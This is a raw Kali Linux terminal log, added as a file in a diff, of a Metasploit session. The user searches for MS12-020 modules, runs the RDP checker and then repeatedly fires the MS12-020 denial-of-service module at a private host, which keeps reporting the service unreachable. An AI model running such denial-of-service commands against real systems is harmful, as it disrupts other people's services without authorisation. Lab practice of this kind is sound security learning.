@@ -1,0 +1,180 @@
+root@kali:~# service postgresql start
+msfdb rroot@kali:~# msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+root@kali:~# search ms12-020
+bash: search: command not found
+root@kali:~# msfconsole
+                                                  
+
+  Metasploit Park, System Security Interface
+  Version 4.0.5, Alpha E
+  Ready...
+  > access security
+  access: PERMISSION DENIED.
+  > access security grid
+  access: PERMISSION DENIED.
+  > access main security grid
+  access: PERMISSION DENIED....and...
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+  YOU DIDN'T SAY THE MAGIC WORD!
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1796 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > search ms12-02
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank     Description
+   ----                                              ---------------  ----     -----------
+   auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal   MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+   auxiliary/scanner/rdp/ms12_020_check                               normal   MS12-020 Microsoft Remote Desktop Checker
+   exploit/windows/fileformat/ms12_027_mscomctl_bof  2012-04-10       average  MS12-027 MSCOMCTL ActiveX Buffer Overflow
+
+
+msf > show options
+
+Global Options:
+===============
+
+   Option            Current Setting    Description
+   ------            ---------------    -----------
+   ConsoleLogging    false              Log all console input and output
+   LogLevel          0                  Verbosity of logs (default 0, max 3)
+   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
+   Prompt            msf                The prompt string
+   PromptChar        >                  The prompt character
+   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
+   SessionLogging    false              Log all input and output for sessions
+   TimestampOutput   false              Prefix all console output with a timestamp
+
+msf > user auxiliary/scanner/rdp/ms12_020_check
+[-] Unknown command: user.
+msf > use auxiliary/scanner/rdp/ms12_020_check
+msf auxiliary(scanner/rdp/ms12_020_check) > show options
+
+Module options (auxiliary/scanner/rdp/ms12_020_check):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    3389             yes       Remote port running RDP (TCP)
+   THREADS  1                yes       The number of concurrent threads
+
+msf auxiliary(scanner/rdp/ms12_020_check) > set RHOST 192.168.1.8
+[!] RHOST is not a valid option for this module. Did you mean RHOSTS?
+RHOST => 192.168.1.8
+msf auxiliary(scanner/rdp/ms12_020_check) > set RHOSTs 192.168.1.8
+RHOSTs => 192.168.1.8
+msf auxiliary(scanner/rdp/ms12_020_check) > run
+
+[*] 192.168.1.8:3389      - 192.168.1.8:3389 - Cannot reliably check exploitability.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/rdp/ms12_020_check) > run
+
+[*] 192.168.1.8:3389      - 192.168.1.8:3389 - Cannot reliably check exploitability.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/rdp/ms12_020_check) > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > show options
+
+Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    3389             yes       The target port (TCP)
+
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+[-] Auxiliary failed: Msf::OptionValidateError The following options failed to validate: RHOST.
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set RHOST 192.168.1.8
+RHOST => 192.168.1.8
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > exploit
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > show options
+
+Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST    192.168.1.8      yes       The target address
+   RPORT    3389             yes       The target port (TCP)
+
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > show options
+
+Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.1.8      yes       The target address
+   RPORT  3389             yes       The target port (TCP)
+
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
+
+[-] 192.168.1.8:3389 - 192.168.1.8:3389 - RDP Service Unreachable
+[*] Auxiliary module execution completed
+msf auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > 
+
